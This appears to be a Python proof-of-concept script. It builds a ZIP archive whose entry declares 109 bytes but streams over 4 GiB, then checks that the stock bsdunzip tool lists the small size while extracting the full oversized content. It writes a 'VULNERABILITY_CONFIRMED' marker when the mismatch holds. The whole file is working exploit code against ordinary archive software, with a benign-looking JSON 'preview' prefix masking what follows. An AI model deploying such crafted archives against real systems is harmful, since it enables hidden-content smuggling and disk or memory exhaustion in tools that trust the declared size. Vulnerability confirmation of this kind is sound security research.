import argparse
import pathlib
import shutil
import subprocess
import sys


MARKER = b"LIBARCHIVE_STOCK_CLI_BOUNDARY_MARKER_v1"
DECLARED_SIZE = 109
ACTUAL_SIZE = (1 << 32) + DECLARED_SIZE


def make_prefix(path):
    prefix = b'{"type":"preview","safe":true,"name":"seed","version":1}'
    prefix = prefix + b" " * (DECLARED_SIZE - len(prefix))
    path.write_bytes(prefix + MARKER + b"\x00" * 512)


def run(cmd):
    return subprocess.run(cmd, text=True, capture_output=True, check=False)


def stream_and_confirm(cmd):
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    total = 0
    found = -1
    tail = b""
    while True:
        chunk = proc.stdout.read(1048576)
        if chunk == b"":
            break
        window = tail + chunk
        pos = window.find(MARKER)
        if found < 0 and pos >= 0:
            found = total - len(tail) + pos
        total += len(chunk)
        tail = window[-len(MARKER):]
    stderr = proc.stderr.read().decode("utf-8", "replace")
    code = proc.wait()
    return code, total, found, stderr


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--work-dir", default="run/stock-marker")
    parser.add_argument("--bsdunzip", default="bsdunzip")
    args = parser.parse_args()

    root = pathlib.Path(__file__).resolve().parent
    bsdunzip = shutil.which(args.bsdunzip) or args.bsdunzip
    work = pathlib.Path(args.work_dir).resolve()
    work.mkdir(parents=True, exist_ok=True)
    prefix = work / "prefix.bin"
    archive = work / "stock_cli_declared_109_actual_4g_plus_109.zip"
    marker_file = work / "VULNERABILITY_CONFIRMED.marker"

    make_prefix(prefix)
    gen = run(
        [
            sys.executable,
            str(root / "make_debuginfod_zip.py"),
            "--method",
            "stored-sparse",
            "--elf",
            str(prefix),
            "--out",
            str(archive),
        ]
    )
    if gen.returncode != 0:
        sys.stderr.write(gen.stdout)
        sys.stderr.write(gen.stderr)
        return gen.returncode

    listing = run([bsdunzip, "-l", str(archive)])
    if listing.returncode != 0 or "      109" not in listing.stdout:
        sys.stderr.write(listing.stdout)
        sys.stderr.write(listing.stderr)
        return 1

    code, total, found, stderr = stream_and_confirm([bsdunzip, "-p", str(archive)])
    confirmed = code == 0 and total == ACTUAL_SIZE and found == DECLARED_SIZE
    if confirmed:
        marker_file.write_text(
            "confirmed=true\n"
            "source=stock_bsdunzip_stdout\n"
            f"declared_size={DECLARED_SIZE}\n"
            f"actual_streamed_size={total}\n"
            f"marker_offset={found}\n"
            f"marker={MARKER.decode()}\n",
            encoding="utf-8",
        )

    print(f"archive={archive}")
    print(f"declared_size={DECLARED_SIZE}")
    print(f"actual_streamed_size={total}")
    print(f"bsdunzip_exit={code}")
    print(f"marker_offset={found}")
    print(f"marker_file={marker_file if confirmed else ''}")
    if stderr:
        print(f"stderr={stderr!r}")
    return 0 if confirmed else 1


if __name__ == "__main__":
    raise SystemExit(main())
